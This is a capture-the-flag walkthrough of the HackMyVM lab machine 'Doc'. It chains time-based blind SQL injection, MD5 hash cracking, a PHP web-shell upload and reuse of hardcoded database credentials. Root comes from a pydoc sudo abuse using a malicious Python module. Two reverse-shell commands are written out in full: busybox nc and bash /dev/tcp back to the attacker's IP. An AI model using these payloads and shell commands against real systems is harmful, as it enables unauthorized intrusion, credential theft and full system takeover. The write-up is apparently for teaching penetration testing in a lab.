# Doc

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Doc | sml | Beginner | HackMyVM |

**Summary:** Doc is a beginner-friendly vulnerable machine hosted on HackMyVM that focuses on SQL injection exploitation and Linux privilege escalation through Python's pydoc service. The attack path begins with discovering an "Online Traffic Offense Management System" running on nginx 1.18.0. The login form is vulnerable to time-based blind SQL injection, allowing credential extraction from the database. After cracking the MD5 password hashes, administrative access is gained to the web panel where file upload functionality exists. By uploading a PHP web shell through the "Portal Cover" feature, remote code execution is achieved as www-data. Database credentials found in the application's initialization file allow lateral movement to user "bella". The privilege escalation vector involves exploiting sudo permissions on `/usr/bin/doc`, which spawns a Python pydoc server on localhost. By creating a malicious Python module and triggering its import through pydoc's web interface, a reverse shell is spawned as root, completing the compromise.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying active hosts on the network. Using a custom PowerShell scanning script, the target machine was located:

```bash
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.63 08:00:27:11:AC:9D VirtualBox
```

The target IP address is **192.168.100.63** running on VirtualBox infrastructure.

### Port Scanning

A comprehensive Nmap scan was executed to enumerate all open ports and identify running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ nmap -sC -sV -p- 192.168.100.63
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 05:46 WIB
Nmap scan report for 192.168.100.63
Host is up (0.0033s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
```

**Key Findings:**
- Only **port 80 (HTTP)** is open
- Web server: **nginx 1.18.0**
- Application: **Online Traffic Offense Management System - PHP**
- Security issue: PHPSESSID cookie has **httponly flag not set** (potential for XSS exploitation)

### Web Application Enumeration

Initial access to the web application via IP address revealed the landing page:

![](image.png)

![](image-1.png)

Upon inspecting the HTML source code, all resource references pointed to the domain `doc.hmv`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ curl http://192.168.100.63
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Online Traffic Offense Management System - PHP</title>
    <link rel="icon" href="http://doc.hmv/dist/img/no-image-available.png" />
    <!-- Google Font: Source Sans Pro -->
...
```

The application requires domain-based access for proper functionality. The domain was added to `/etc/hosts`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ echo '192.168.100.63 doc.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.63 doc.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ cat /etc/hosts | grep 192.168.100.63
192.168.100.63 doc.hmv
```

Accessing the application via the domain name resolved all resource loading issues:

![](image-3.png)

### Identifying the Attack Surface

The administrative login panel was located at `http://doc.hmv/admin/login.php`:

![](image-2.png)

This login form became the primary target for exploitation, as it represents the authentication gateway to privileged functionality.

---

## Initial Access

### SQL Injection Discovery

To test for SQL injection vulnerabilities, an authentication attempt was captured using Burp Suite:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ cat req.txt
POST /classes/Login.php?f=login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Connection: keep-alive
Content-Length: 29
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=4o42mq669nr2da9uhun0056qlp
Host: doc.hmv
Origin: http://doc.hmv
Referer: http://doc.hmv/admin/login.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest

username=admin&password=admin
```

The captured request was fed to SQLMap for automated SQL injection testing:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ sqlmap -r req.txt --batch --dbs
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2090 FROM (SELECT(SLEEP(5)))SGTK) AND 'iJYY'='iJYY&password=admin
---
...
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
available databases [2]:
[*] doc
[*] information_schema
...
```

**Vulnerability Confirmed:**
- **Type:** Time-based blind SQL injection
- **Parameter:** `username` (POST)
- **Backend DBMS:** MySQL >= 5.0.12 (MariaDB fork)
- **Databases:** `doc`, `information_schema`

### Database Enumeration

The `doc` database was enumerated to identify data tables:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ sqlmap -r req.txt --batch -D doc --tables
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2090 FROM (SELECT(SLEEP(5)))SGTK) AND 'iJYY'='iJYY&password=admin
---
...
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
Database: doc
[7 tables]
+---------------+
| drivers_list  |
| drivers_meta  |
| offense_items |
| offense_list  |
| offenses      |
| system_info   |
| users         |
+---------------+
...
```

The **`users`** table immediately became the priority target for credential extraction.

### Credential Extraction

The schema of the `users` table was retrieved:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ sqlmap -r req.txt --batch -D doc -T users --columns
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2090 FROM (SELECT(SLEEP(5)))SGTK) AND 'iJYY'='iJYY&password=admin
---
...
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
Database: doc
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| type         | tinyint(1)   |
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int(50)      |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| username     | text         |
+--------------+--------------+
...
```

Username and password columns were dumped:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ sqlmap -r req.txt --batch -D doc -T users -C "username,password" --dump
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2090 FROM (SELECT(SLEEP(5)))SGTK) AND 'iJYY'='iJYY&password=admin
---
...
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
Database: doc
Table: users
[2 entries]
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| adminyo  | 019[REDACTED] (a[REDACTED])                  |
| jsmith   | 125[REDACTED] (j[[REDACTED]])                |
+----------+----------------------------------------------+
...
```

SQLMap automatically identified the password hashes as MD5 and cracked them. Manual verification with hashcat confirmed the credentials:

**First hash (adminyo):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ hashcat -m 0 "019[REDACTED]" /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 1394/2789 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2695 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

019[REDACTED]:a[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 019[REDACTED]
Time.Started.....: Tue Feb  3 06:39:47 2026 (0 secs)
Time.Estimated...: Tue Feb  3 06:39:47 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2193.5 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 90112/14344385 (0.63%)
Rejected.........: 0/90112 (0.00%)
Restore.Point....: 86016/14344385 (0.60%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: burats -> KATKAT
Hardware.Mon.#01.: Util: 24%

Started: Tue Feb  3 06:39:23 2026
Stopped: Tue Feb  3 06:39:48 2026
```

**Second hash (jsmith):**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ hashcat -m 0 "125[REDACTED]" /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7300U CPU @ 2.60GHz, 1394/2789 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (2917 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

125[REDACTED]:j[[REDACTED]]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 125[REDACTED]
Time.Started.....: Tue Feb  3 06:41:19 2026 (3 secs)
Time.Estimated...: Tue Feb  3 06:41:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2289.8 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6856704/14344385 (47.80%)
Rejected.........: 0/6856704 (0.00%)
Restore.Point....: 6852608/14344385 (47.77%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: jsts4691 -> js25411
Hardware.Mon.#01.: Util: 31%

Started: Tue Feb  3 06:41:18 2026
Stopped: Tue Feb  3 06:41:24 2026
```

**Cracked Credentials:**
- `adminyo:a[REDACTED]`
- `jsmith:j[[REDACTED]]`

### Administrative Access

Using the `adminyo:a[REDACTED]` credentials, administrative access to the web panel was achieved:

![](image-4.png)

### File Upload Exploitation

Within the administrative settings, a "Portal Cover" image upload feature was discovered:

![](image-5.png)

This file upload functionality lacks proper validation, allowing arbitrary PHP files to be uploaded. A simple PHP web shell was prepared:

![](image-8.png)

The web shell code used as shown in above.

After uploading the shell through the "Portal Cover" feature, the HTML source code revealed the upload path:

```javascript
...
<div class="form-group">
				<label for="" class="control-label">Potal Cover</label>
				<div class="custom-file">
	              <input type="file" class="custom-file-input rounded-circle" id="customFile" name="cover" onchange="displayImg2(this,$(this))">
	              <label class="custom-file-label" for="customFile">Choose file</label>
	            </div>
			</div>
			<div class="form-group d-flex justify-content-center">
				<img src="http://doc.hmv/uploads/1770076140_shell.php" alt="" id="cimg2" class="img-fluid img-thumbnail">
			</div>
...
```

The uploaded shell is accessible at: `http://doc.hmv/uploads/1770076140_shell.php`

### Remote Code Execution

Testing the web shell confirmed successful code execution:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ curl -I http://doc.hmv/uploads/1770076140_shell.php
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 02 Feb 2026 23:55:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ curl http://doc.hmv/uploads/1770076140_shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE Achieved as www-data user!**

### Establishing Reverse Shell

A netcat listener was started on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell payload was constructed using busybox netcat: `busybox nc 192.168.100.1 4444 -e /bin/bash`

URL-encoded payload: `busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash`

Triggering the reverse shell:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ curl http://doc.hmv/uploads/1770076140_shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

Connection established:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 56796
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilization

Upgrading to a fully interactive TTY:

```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@doc:~/html/traffic_offense/uploads$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@doc:~/html/traffic_offense/uploads$
```

---

## Privilege Escalation

### Lateral Movement to User "bella"

Enumerating the system revealed a single user account:

```bash
www-data@doc:~$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Aug 24  2021 .
drwxr-xr-x 18 root  root  4096 Aug 24  2021 ..
drwxr-xr-x  3 bella bella 4096 Feb  2 19:03 bella
```

Searching for references to user "bella" in web application files:

```bash
www-data@doc:~$ grep -r bella 2>/dev/null
...
html/traffic_offense/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
```

The database initialization file contained hardcoded credentials:

```bash
www-data@doc:~$ cd html/traffic_offense/
www-data@doc:~/html/traffic_offense$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://doc.hmv/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"b[REDACTED]");
if(!defined('DB_NAME')) define('DB_NAME',"doc");
?>
```

**Database Credentials Found.**

Attempting to use these credentials for SSH or user switch:

```bash
www-data@doc:~$ su - bella
Password:
bella@doc:~$ id
uid=1000(bella) gid=1000(bella) groups=1000(bella),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
bella@doc:~$ ls -la
total 36
drwxr-xr-x 3 bella bella 4096 Feb  2 19:03 .
drwxr-xr-x 3 root  root  4096 Aug 24  2021 ..
-rw------- 1 bella bella    8 Feb  2 19:03 .bash_history
-rw-r--r-- 1 bella bella  220 Aug 24  2021 .bash_logout
-rw-r--r-- 1 bella bella 3526 Aug 24  2021 .bashrc
drwxr-xr-x 3 bella bella 4096 Aug 24  2021 .local
-rw-r--r-- 1 bella bella  807 Aug 24  2021 .profile
-rw------- 1 bella bella   14 Aug 24  2021 user.txt
-rw------- 1 bella bella   49 Aug 25  2021 .Xauthority
```

**User Flag Captured!** (user.txt in bella's home directory)

### Identifying Privilege Escalation Vector

Checking sudo privileges for user bella:

```bash
bella@doc:~$ sudo -l
Matching Defaults entries for bella on doc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bella may run the following commands on doc:
    (ALL : ALL) NOPASSWD: /usr/bin/doc
```

User bella can execute `/usr/bin/doc` as root without a password. Testing this binary:

```bash
bella@doc:~$ sudo /usr/bin/doc
Server ready at http://localhost:7890/
Server commands: [b]rowser, [q]uit
server> b
server> help
Server commands: [b]rowser, [q]uit
server> q
Server stopped
```

The `/usr/bin/doc` binary launches a Python documentation server (pydoc) on port 7890. Running it in the background revealed the underlying processes:

```bash
bella@doc:~$ sudo /usr/bin/doc &
[1] 1575
bella@doc:~$ Server ready at http://localhost:7890/
Server commands: [b]rowser, [q]uit
server>

[1]+  Stopped                 sudo /usr/bin/doc
bella@doc:~$ ps aux | grep doc
root        1575  0.0  0.4  10592  4908 pts/0    T    19:53   0:00 sudo /usr/bin/doc
root        1576  0.0  0.1   2172  1076 pts/0    T    19:53   0:00 /usr/bin/doc
root        1577  0.0  0.0   2420   576 pts/0    T    19:53   0:00 sh -c /usr/bin/pydoc3.9 -p 7890
root        1578  0.5  1.7  99608 17820 pts/0    Tl   19:53   0:00 /usr/bin/python3.9 /usr/bin/pydoc3.9 -p 7890
bella       1581  0.0  0.0   3048   716 pts/0    R+   19:53   0:00 grep doc
```

The process chain shows that `/usr/bin/doc` executes `/usr/bin/pydoc3.9 -p 7890` as **root**, spawning a Python documentation HTTP server.

Verifying the service is listening:

```bash
bella@doc:~$ ss -tulpan
Netid State  Recv-Q  Send-Q    Local Address:Port     Peer Address:Port Process
udp   UNCONN 0       0               0.0.0.0:68            0.0.0.0:*
udp   ESTAB  0       0        192.168.100.63:51825     192.168.1.1:53
tcp   LISTEN 0       80            127.0.0.1:3306          0.0.0.0:*
tcp   LISTEN 0       511             0.0.0.0:80            0.0.0.0:*
tcp   LISTEN 0       5             127.0.0.1:7890          0.0.0.0:*
tcp   LISTEN 0       128           127.0.0.1:21            0.0.0.0:*
tcp   ESTAB  0       2        192.168.100.63:33548   192.168.100.1:4444
tcp   LISTEN 0       511                [::]:80               [::]:*
```

Port **7890** is listening on localhost only.

### Exploiting Pydoc for Root Shell

The pydoc service running as root can be exploited by creating a malicious Python module and accessing it through pydoc's web interface. When pydoc attempts to generate documentation for the module, it imports the module, executing any code within.

**Step 1: Start the pydoc server with auto-browse**

Using a pipe to automatically send the "b" (browser) command to keep the server active:

```bash
bella@doc:~$ { echo "b"; while true; do sleep 1; done; } | sudo /usr/bin/doc > /dev/null 2>&1 &
[1] 1624
bella@doc:~$ sleep 2
```

**Step 2: Port forward using socat**

Since pydoc is only accessible on localhost, socat was used to forward external port 8080 to localhost:7890:

```bash
bella@doc:~$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:7890 &
[2] 1716
```

Now the pydoc server is accessible via `http://doc.hmv:8080`:

![](image-9.png)

**Step 3: Create malicious Python module**

First, cleaning up the background jobs:

```bash
bella@doc:~$ jobs
[1]-  Running                 { echo "b"; while true; do
    sleep 1;
done; } | sudo /usr/bin/doc > /dev/null 2>&1 &
[2]+  Running                 socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:7890 &
bella@doc:~$ kill -9 %1 %2
bella@doc:~$ jobs
[1]-  Killed                  { echo "b"; while true; do
    sleep 1;
done; } | sudo /usr/bin/doc > /dev/null 2>&1
[2]+  Killed                  socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:7890
bella@doc:~$ jobs
```

Creating a malicious Python module in `/tmp/root.py` that spawns a reverse shell:

```bash
bella@doc:~$ cd /tmp
bella@doc:/tmp$ cat > /tmp/root.py << 'EOF'
> #!/usr/bin/python3
> import os
> os.system("bash -c 'bash -i >& /dev/tcp/192.168.100.1/8888 0>&1'")
> EOF
bella@doc:/tmp$ chmod +x /tmp/root.py
```

**Step 4: Set up port forwarding and start pydoc server**

```bash
bella@doc:/tmp$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:7890 &
[1] 5410
bella@doc:/tmp$ sudo /usr/bin/doc
Server ready at http://localhost:7890/
Server commands: [b]rowser, [q]uit
server>
```

**Step 5: Start reverse shell listener**

On the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

**Step 6: Trigger the exploit**

Access `http://doc.hmv:8080/get?key=root` through a web browser. The pydoc server attempts to load documentation for the module named "root", which imports `/tmp/root.py`, executing the reverse shell code as root.

**Root shell received:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 57869
root@doc:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@doc:/tmp# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@doc:/tmp# ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/docs]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

root@doc:/tmp# cd
root@doc:~# id ; hostname ; whoami
uid=0(root) gid=0(root) groups=0(root)
doc
root
root@doc:~# cat /root/root.txt /home/bella/user.txt
HMVfinallyroot
HMVtakemydocs
```

**System Fully Compromised!**

**Flags Captured.**

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning to identify target IP 192.168.100.63 running nginx 1.18.0 with "Online Traffic Offense Management System" on port 80. Discovered domain requirement (doc.hmv) through HTML source code analysis.

2. **Vulnerability Discovery**: Located administrative login panel at `/admin/login.php`. Captured POST request and tested with SQLMap, revealing time-based blind SQL injection in the `username` parameter. Enumerated database structure finding the `users` table in the `doc` database.

3. **Credential Extraction & Authentication Bypass**: Extracted two user records (adminyo, jsmith) with MD5 password hashes via SQL injection. Cracked hashes using hashcat with rockyou.txt wordlist, obtaining credentials `adminyo:a[REDACTED]` and `jsmith:j[[REDACTED]]`. Authenticated to administrative panel using adminyo account.

4. **Remote Code Execution**: Discovered unrestricted file upload functionality in "Portal Cover" feature within Settings panel. Uploaded PHP web shell to `/uploads/` directory. Achieved RCE as www-data user, then established reverse shell using busybox netcat.

5. **Lateral Movement**: Enumerated web application files and discovered hardcoded database credentials in `/var/www/html/traffic_offense/initialize.php`. Used credentials `bella:b[REDACTED]` to laterally move from www-data to user bella via `su` command, capturing user flag.

6. **Privilege Escalation to Root**: Identified sudo permission allowing bella to execute `/usr/bin/doc` as root without password. Analyzed binary to discover it launches pydoc3.9 HTTP server on localhost:7890 as root. Created malicious Python module `/tmp/root.py` containing reverse shell payload. Used socat to port forward 8080→7890, then triggered pydoc to import the malicious module via web interface (`/get?key=root`). Module import executed reverse shell code as root, achieving full system compromise and capturing root flag.

